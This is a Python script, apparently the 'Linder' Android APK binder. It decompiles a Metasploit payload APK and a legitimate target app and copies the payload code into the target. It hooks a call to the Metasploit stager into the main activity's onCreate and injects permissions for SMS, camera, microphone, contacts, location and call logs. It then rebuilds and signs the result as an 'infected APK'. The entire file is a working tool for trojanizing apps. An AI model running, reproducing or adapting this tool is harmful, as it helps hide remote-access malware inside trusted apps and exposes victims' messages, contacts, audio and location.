import os,sys,subprocess,socket
import shutil,urllib.request
from xml.dom.minidom import parseString
from time import sleep


YELLOW = '\033[33m'
BLUE = '\033[34m'
CYAN = '\033[36m'
GREEN = '\033[32;1m'
RED = '\033[31;1m'
WHITE = '\033[m'


cp = ''
mv = ''
rm = ''

if os.name == 'nt':
	cp = 'xcopy /q /y'
	mv = 'move '
	rm = 'rmdir /S /Q'
else:
	cp = 'cp -r'
	mv = 'mv'
	rm = 'rm -rf'

global package, package_name, package_name_path, smali_loc, smali_path,P1,Termux_Bool

input_apk=""
output_apk=""
payload_apk=""

Termux_Bool = os.path.exists("/data/data/com.termux/files/home")

def err_msg(msg):
    print(RED + "[!] " + msg + WHITE)

def print_status(msg):
    print(CYAN + "[+] " + msg + WHITE)

def isOnline():
    try:
        # connect to the host
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False

def Update():
		print_status(YELLOW + 'Checking for updates...')
		oo = open('.ver','r').read()
		u=urllib.request.urlopen('https://raw.githubusercontent.com/R37r0-Gh057/Linder/master/.ver').read().decode('utf-8')
		if oo.split('\n')[0] == u.split('\n')[0]:
			print_status(YELLOW + 'No updates available')
		else:
			print_status(GREEN + "Update available. Updating...(DONT CLOSE!) ")
			files_to_update=['main.py','README.md','CONTRIBUTORS.md','termux-setup.sh','CHANGELOG.MD','.ver']
			for fn in files_to_update:
				try:
					u=urllib.request.urlopen('https://github.com/R37r0-Gh057/Linder/raw/master/'+fn).read().decode('utf-8')
				except:
					err_msg("Error While Fetching Updates...")
					print_status(YELLOW+"Reverting Changes...")
					for dlf in files_to_update:
						os.remove(dlf+'.tmp')
					print_status("Exiting....")
					exit()
				f=open(fn+'.tmp','w')
				f.write(u)
				f.close()
			for fn in files_to_update:
				os.rename(fn+'.tmp',fn)
			print_status(GREEN + "Update Finished....")
			print_status(BLUE + "Please Restart The Script...")
			exit()
def Usage():
	print(RED+"\n\t\tUsage:"+WHITE)
	print(GREEN+"\nInterface Mode: \n\n"+WHITE)
	print(YELLOW+f"python3 {sys.argv[0]}\n")
	print(GREEN+"\nCommand Line Mode: \n\n"+WHITE)
	print(YELLOW + 'python3 %s <payload.apk> <target.apk> <output.apk> \n' % (str(sys.argv[0])))
	print(GREEN+"\nTo UPDATE: \n\n"+WHITE)
	print(YELLOW+f"python3 {sys.argv[0]} --update\n"+WHITE)
	exit()

# Getting payload apk name

def PN():
	if '/' in str(payload_apk):
		tmp = str(payload_apk).split('/')
		name = tmp[len(tmp) - 1]
		return str(name)
	else:
		return str(payload_apk)

# Getting original apk name

def ON():
	if '/' in input_apk:
		tmp = input_apk.split('/')
		name = tmp[len(tmp) - 1]
		return name
	else:
		return str(input_apk)



# Finding main activity smali

def findA(xml):
	with open(xml,'r') as f:
		dom = parseString(f.read())
		activities = dom.getElementsByTagName('activity')
		for activity in activities:
			intents = activity.getElementsByTagName('intent-filter')
			for intent in intents:
				actions = intent.getElementsByTagName('action')
				for action in actions:
					if action.getAttribute('android:name') == 'android.intent.action.MAIN':
						return activity.getAttribute('android:name')
	

# If couldnt find path of activity, then joining the package name and activity name to get the activity path

def SetA(A):
	if len(A.split('.')) == 1:
		A = P1+'.'+A		# P1 variable stores the package name
	elif len(A.split('.')) == 2:
		A= P1+A
	return A

# Finding package name
def findP(xml):
	fi = open(xml,'r')
	f=fi.readline()+fi.readline()
	pos1=f.find("package=")+9
	pos2=f.find('"',pos1+1)
	if pos1==8:
		return ''
	else:
		return f[pos1:pos2]

# Self Explanatory:

def SetP(P):
	global package,P1
	if '"' in P:
		P = P.replace('"','')
	if '>' in P:
		P = P.replace('>','')
	if '<' in P:
		P = P.replace('<','')
	P1 = P
	package = P.replace('.', '/')
	return package, P


# Finding hook point in the main activity smali
def find(smali,par):
	count = 0
	SmaliCon = ''
	TargetStr = ''

	with open(smali,'r') as f:
		SmaliCon = f.read()
		for i in SmaliCon.split('\n'):
			if 'invoke-super' in i and 'onCreate(Landroid/os/Bundle;)V' in i:
					TargetStr = i
					break
			else:
				count += 1
	if TargetStr != '':
		print ("Hook point can be injected after line %d" % (count + 1))
		return SmaliCon, TargetStr, count

# Injecting hook in smali

def newsmali(contents,targetstring):
	with open('newsmali','w') as f:
		for i in contents.split('\n'):
			if i == targetstring:
				f.write('\n')
				f.write(i)
				f.write('\n')
				f.write('    invoke-static/range {p0}, Lcom/metasploit/stage/Payload;->start()V')
			else:
				f.write('\n')
				f.write(i)


# The main event

def Bind():
	try:
		global out,Termux_Bool
		Perms_List = ['<uses-permission android:name="android.permission.INTERNET"/>',
                        '<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>',
                        '<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>',
                        '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
                        '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>',
                        '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>',
                        '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
                        '<uses-permission android:name="android.permission.SEND_SMS"/>',
                        '<uses-permission android:name="android.permission.RECEIVE_SMS"/>',
                        '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
                        '<uses-permission android:name="android.permission.CALL_PHONE"/>',
                        '<uses-permission android:name="android.permission.READ_CONTACTS"/>',
                        '<uses-permission android:name="android.permission.WRITE_CONTACTS"/>',
                        '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
                        '<uses-permission android:name="android.permission.WRITE_SETTINGS"/>',
                        '<uses-permission android:name="android.permission.CAMERA"/>',
                        '<uses-permission android:name="android.permission.READ_SMS"/>',
                        '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
                        '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>',
                        '<uses-permission android:name="android.permission.SET_WALLPAPER"/>',
                        '<uses-permission android:name="android.permission.READ_CALL_LOG"/>',
                        '<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>',
                        '<uses-permission android:name="android.permission.WAKE_LOCK"/>']

		Feature_List = ['<uses-feature android:name="android.hardware.camera"/>',
                        '<uses-feature android:name="android.hardware.camera.autofocus"/>',
                        '<uses-feature android:name="android.hardware.microphone"/>']


		payload = PN()
		original = ON()

	# STEP 1.
		
		try:
			if os.path.isdir("TempP"):
				print_status("Cleaning Temporary Files...")
				subprocess.call(rm + " TempP",shell=True)
				if not os.path.isdir("TempP"):
					os.mkdir("TempP")
				print_status("done.")
			else:
				os.mkdir("TempP")
		except:
			pass
		print_status("Copying APKs...")
		subprocess.call(cp + ' ' +  str(payload_apk) + " TempP", shell=True)
		subprocess.call(cp + ' ' + str(input_apk) + " TempP", shell=True)

		print_status("done.")

	# STEP 2.

		print_status("Decompiling APKs...\n")
		os.chdir("TempP/")
		if Termux_Bool:
			os.system('apkmod -d %s -o %s' % (original,original.replace('.apk','')))
			os.system('apkmod -d %s -o %s' % (payload,payload.replace('.apk','')))
		else:
			os.system('apktool d -f %s' % (original))
			os.system('apktool d -f %s' % (payload))

		print_status("\ndone.")
	# STEP 3.

		print_status('Copying payload smali codes to target apk...')
		if cp.lower().startswith("xcopy"):
			subprocess.call(cp + ' /e "%s/smali/"  "%s/smali/"' % (payload.replace('.apk',''), original.replace('.apk','')), shell=True)
		else:
			subprocess.call(cp + ' "%s/smali/com/"  "%s/smali/"' % (payload.replace('.apk',''), original.replace('.apk','')), shell=True)
		print_status("done.")

	# STEP 4.

		print_status("Fetching Package Name & MainActivity smali location")
		package_name_path, package_name = SetP(findP('%s/AndroidManifest.xml' % (original.replace('.apk',''))))
		smalitarget = SetA(findA("%s/AndroidManifest.xml" % (original.replace('.apk',''))))
		smali_name = smalitarget.split('.')[len(smalitarget.split('.')) - 1]
		smali_loc = smalitarget.replace('.','/')
		if not os.path.isfile("%s/smali/%s.smali" % (original.replace('.apk',''),smali_loc)): # Will be fixed in the next update
			err_msg(YELLOW + "\n\nIt looks like this app is somewhat protected. \nThe MainActivity smali file which is specified in the AndroidManifest.xml (%s) is not present. This will be fixed in the next update\n CANNOT CONTINUE. EXITING..." % (smali_loc))
			subprocess.call(rm + 'TempP')
			exit()
		else:
			smali_name = smali_loc.split('/')[len(smali_loc.split('/')) - 1]
			print_status("\nMainActivity Smali location:- " + GREEN + '%s' %(str(smali_loc)))
			print_status('Package Name:- ' + GREEN + '%s' % (str(package_name)))
			print ("\n")

	# STEP 5.
		print_status("Injecting Hook")
		con,trgstr,lineno = find(original.replace('.apk','')+'/smali/'+smali_loc+'.smali','null' )
		newsmali(con,trgstr)
		subprocess.call(mv + ' newsmali %s/smali/%s.smali' % (original.replace('.apk',''), smali_loc),shell=True)

	# STEP 6.

		print_status ("Writing Permissions,Features,etc.")
		tar_man='%s/AndroidManifest.xml' % (original.replace('.apk',''))
		with open(tar_man,'r') as f:
			con = f.read()
			spcP = 0
			spcF = 0
			delF = []
			delP = []
			fbool = False
			pbool = False
			for i in con.split('\n'):
				if Perms_List.count(i.strip()) >0:
					Perms_List.remove(i.strip())
					spcP = i.find('<')
				elif Feature_List.count(i.strip()) >0:
					Feature_List.remove(i.strip())
					spcF = i.find('<')
			f1 = open(tar_man,'w')
			for i in con.split('\n'):
				if "<uses-permission " in i and not pbool:
					for k in Perms_List:
						f1.write('\n')
						print (YELLOW + "\n 	Injecting Permission:- " + WHITE + k)
						f1.write((' ' * spcP) + k)
					pbool = True
				elif "<uses-feature " in i and not fbool:
					for k in Feature_List:
						f1.write('\n')
						print (YELLOW + "\n 	Injecting Feature:- " + WHITE + k)
						f1.write((' ' * spcF) + k)
					fbool = True
				else:
					f1.write(i)
					f1.write('\n')
			f1.close()
		
		print_status('done.')

	# STEP 6.

		print_status('Compiling Infected APK...\n')

		if Termux_Bool:
			subprocess.call("apkmod -r %s -o fin_out.apk" % (original.replace('.apk','')),shell=True)
			os.chdir('../')
		else:
			subprocess.call("apktool b %s -o %s -f" % (original.replace('.apk',''),output_apk),shell=True)
			subprocess.call(mv + ' '+ output_apk + ' ..',shell=True)
			os.chdir('../')
		print_status('Signing Infected APK...\n')
		if Termux_Bool:
			subprocess.call("apkmod -s TempP/fin_out.apk -o %s" % (output_apk),shell=True)
			print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (output_apk,str(os.path.getsize(output_apk))) + WHITE)	
			subprocess.call(rm + " TempP",shell=True)
			exit()
		else:
			subprocess.call("apksigner sign --ks release.keystore --ks-pass pass:lmaolmfao %s" % (output_apk),shell=True)
		print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (output_apk,str(os.path.getsize(output_apk))) + WHITE)
		subprocess.call(rm + " TempP",shell=True)
		exit()
	except (UnicodeDecodeError) as e:
		subprocess.call(rm + ' TempP',shell=True)
		err_msg("Looks like APKTool has failed to decompile properly. Exiting...")
		exit()
	except Exception as e:
		subprocess.call(rm + ' TempP',shell=True)
		err_msg("ERROR OCCURED! EXITING...")
		print('\n' + str(e))
		exit()

# Checking whether APKTOOL & APKSIGNER are installed or not.

def main():
	print_status("Checking whether APKTOOL is installed or not...")
	if shutil.which('apktool') == None:
		err_msg("ERROR: " + WHITE + "APKTOOL is not installed or not in path. Exiting.")
		exit()
	else:
		print(GREEN + "INSTALLED" + WHITE)
	if Termux_Bool:
		if shutil.which('apkmod')==None:
			err_msg("ERROR: " + WHITE + "Please run " + GREEN + "termux-setup.sh" + WHITE + " to install dependencies.")
			exit()
		else:
			argscheck()
	print_status("Checking whether APKSIGNER is installed or not...")
	if shutil.which('apksigner')==None:
		err_msg("\nERROR: " + WHITE + "APKSIGNER is not installed or not in path. Exiting")
		exit()
	else:
		print(GREEN + "INSTALLED" + WHITE)
	print_status(YELLOW + "ALL OK, Checking args...\n\n")
	argscheck()

def pathcheck(op):
	a = ''
	delim = ''
	if '/' in op:
		delim='/'
	elif '\\' in op:
		delim='\\'
	if delim!= '':
		fop=''
		if os.path.exists(delim.join(op.split(delim)[:-1])):
			if os.path.isdir(op):
				if op.endswith(delim):
					fop=op+"infected.apk"
				else:
					fop=op+delim+"infected.apk"
			elif os.path.isfile(op):
				fop=op
			else:
				fop=os.getcwd()+"infected.apk"
		else:
				fop=os.getcwd()+"infected.apk"
	else:
		if op.endswith('.apk'):
			fop=os.getcwd()+op
		else:
			fop=os.getcwd()+op+".apk"
	print(f"{GREEN}Infected APK TO BE Saved At: {RED}{fop}{WHITE}")
	return fop

# This is self explanatory.

def argscheck():
	global input_apk,output_apk,payload_apk
	if len(sys.argv) == 4:
		if os.path.isfile(str(sys.argv[1])) and os.path.isfile(str(sys.argv[2])):
			if not '.apk' in sys.argv[3]:
				err_msg('Output APK name not specified')
				exit()
			output_apk=pathcheck(sys.argv[3])
			payload_apk=sys.argv[1]
			input_apk=sys.argv[2]
		else:
			err_msg('APK(s) specified are not found!')
			exit()
	elif len(sys.argv) == 2:
		if sys.argv[1] == '--update' or sys.argv[1]=="-u":
                        if isOnline():
                            Update()
                        else:
                            err_msg("Please turn ON your data connection")
                            exit()
		else:
			Usage()
	elif len(sys.argv)==1:
		#Interactive Mode
		while True:
			print(f"{BLUE}Started Interactive Mode{WHITE}")
			print(f"{GREEN}Press {RED}CTRL+Z{GREEN} To Exit{WHITE}")
			pp=input(f"{RED}Enter Path Of PAYLOAD APK: {GREEN}")
			tp=input(f"{RED}Enter Path Of TARGET APK: {GREEN}")
			if not( os.path.isfile(pp) and os.path.isfile(tp) ):
				err_msg('APK(s) specified are not found!')
				print(f"{RED}TRY AGAIN !!!{WHITE}")
				continue
			op=input(f"{RED}Enter Path To Write OUTPUT APK: {GREEN}")
			output_apk=pathcheck(op)
			payload_apk=pp
			input_apk=tp
			input(f"{BLUE}Press{RED} ENTER {BLUE} To Continue...")
			Bind()
			break
	else:
		err_msg("Not enough arguments passed. See help:-\n")
		Usage()


# Lol
print ('\nAuthor:' + RED + "R37r0 Gh057\n" + WHITE)
print ('Github: ' + GREEN + "https://github.com/R37r0-Gh057\n" + WHITE)
print ('Telegram:' + BLUE + "@R37R0_GH057\n" + WHITE)
print("\nSPECIAL THANKS TO:- " + RED + 'TheSpeedX ' + BLUE + "{" + GREEN + 'https://github.com/TheSpeedX' + BLUE + "}" + WHITE + " For Optimising the script. :D\n\n")
print("====================================================\n\n")
sleep(1)

# Finally:-
if not os.path.isfile("release.keystore"):
	err_msg("\nERROR: keystore file not found. EXITING...")
	exit()
else:
	main()
